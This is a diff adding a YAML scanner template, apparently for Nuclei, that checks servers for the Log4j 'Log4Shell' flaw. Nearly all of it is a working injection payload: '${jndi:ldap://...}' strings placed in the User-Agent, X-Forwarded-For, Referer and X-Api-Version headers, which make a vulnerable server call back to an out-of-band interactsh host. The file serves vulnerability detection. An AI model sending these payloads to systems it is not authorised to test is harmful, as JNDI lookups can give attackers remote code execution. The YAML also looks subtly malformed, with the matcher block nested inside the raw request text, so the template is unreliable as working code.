@@ -1,0 +1,23 @@
+id: ldap-log4j
+
+info:
+  name: ldap log4j RCE
+  author: Omkar7505
+  severity: critical
+  tags: rce
+
+requests:
+- raw:
+  - |+
+    GET / HTTP/1.1
+    Host: {{Hostname}}
+    User-agent: ${jndi:ldap://{{Hostname}}.{{interactsh-url}}/a}
+    X-Forwarded-For: ${jndi:ldap://{{Hostname}}.{{interactsh-url}}/a}
+    Referer: ${jndi:ldap://{{Hostname}}.{{interactsh-url}}/a}
+    X-Api-Version: ${jndi:ldap://{{Hostname}}.{{interactsh-url}}/a}
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
